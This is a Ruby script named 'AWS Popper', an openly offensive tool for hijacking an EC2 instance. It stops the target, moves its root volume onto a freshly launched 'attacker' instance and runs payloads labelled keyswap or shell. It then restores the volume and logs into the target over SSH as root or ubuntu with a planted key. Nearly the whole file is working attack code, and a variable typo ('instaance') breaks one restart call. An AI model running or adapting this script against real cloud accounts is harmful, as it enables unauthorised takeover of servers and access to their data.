require 'aws-sdk'
require 'artii'
require 'colorize'
require 'highline/import'
require 'net/ssh'

client = Aws::EC2::Client.new

ascii = `artii "AWS Popper" --font slant` 

puts ascii.white
puts "https://github.com/mike-bailey".yellow

enum = ask "Enumerate Instances? [y/N]: "
if enum == "y"
	instancelist = client.describe_instances()
	instancelist.each { |c| c.reservations.each { |d| d.instances.each { |f| 
		puts "#{f.instance_id} #{f.state.name} #{f.public_ip_address} #{f.instance_type} Arch: #{f.architecture}  Key Name: #{f.key_name}"
	}}}

end

instance = ask "Instance ID: "
`cat /dev/zero | ssh-keygen -q -N ""`
keypair = client.import_key_pair({
  key_name: "AWSPOP#{instance}", 
  public_key_material: File.read("#{Dir.pwd}/popaws.pub"), 
})
target = client.describe_instances({
		instance_ids: ["#{instance}"]
	})
targetaz = target.reservations[0].instances[0].placement.availability_zone
targetip = target.reservations[0].instances[0].public_ip_address
attacker = client.run_instances({
	  image_id: "ami-2d39803a", 
	  instance_type: "t2.micro",
	  min_count: 1, 
	  max_count: 1, 
	  key_name: "AWSPOP#{instance}",
	  placement: {
	  	availability_zone: targetaz,
	  },
	  network_interfaces: [ {
	  	device_index: 0,
	  	associate_public_ip_address: true,
	  } ]
	})
attackid = attacker.instances[0].instance_id
sleep(20)
attackstuff = client.describe_instances({
		instance_ids: ["#{attackid}"]
	})
attackip = attackstuff.reservations[0].instances[0].public_ip_address
puts "Attacking from #{attackip}"

resp = client.stop_instances({ 
		instance_ids: ["#{instance}"]
 })
puts "Sleeping instance..."
sleep(90)

primaryvol = target.reservations[0].instances[0].block_device_mappings[0].ebs.volume_id
resp = client.detach_volume({
		volume_id: primaryvol,
		instance_id: instance
	})
puts "Sleeping volume..."
sleep(30)
takevol = client.attach_volume({
	  volume_id: primaryvol, # required
	  instance_id: attackid, # required
	  device: "/dev/sdx",
	})

puts "Valid Payloads:\nLinux Keyswap\nHD Shell\nWindows Shelling"
payload = ask "Payload to Execute: "
if payload == "Linux Keyswap"
	`#{Dir.pwd}/keyswap.sh #{attackip}`
elsif payload == "HD Shell"
	`ssh  -i #{Dir.pwd}/popaws -o StrictHostKeyChecking=no ubuntu@#{attackip}`
elsif payload == "Windows Shelling"
	`#{Dir.pwd}/winshell.sh #{attackip}`
end
puts "Ending attack in 200sec"
sleep(200)
resp = client.stop_instances({ 
		instance_ids: ["#{attackid}"]
 })
puts "Sleeping attacker box..."
sleep(90)
resp = client.detach_volume({
		volume_id: primaryvol,
		instance_id: attackid
})
puts "Sleeping volume..."
sleep(60)
takevol = client.attach_volume({
	  volume_id: primaryvol, # required
	  instance_id: instance, # required
	  device: "/dev/sda1",
})

# Clean up
resp = client.delete_key_pair({
  key_name: "AWSPOP#{instance}", 
})

resp = client.start_instances({
  instance_ids: ["#{instaance}"] 
})
sleep(60)

`ssh #{targetip} -i #{Dir.pwd}/popaws -o StrictHostKeyChecking=no root@#{targetip}`
`ssh #{targetip} -i #{Dir.pwd}/popaws -o StrictHostKeyChecking=no ubuntu@#{targetip}`

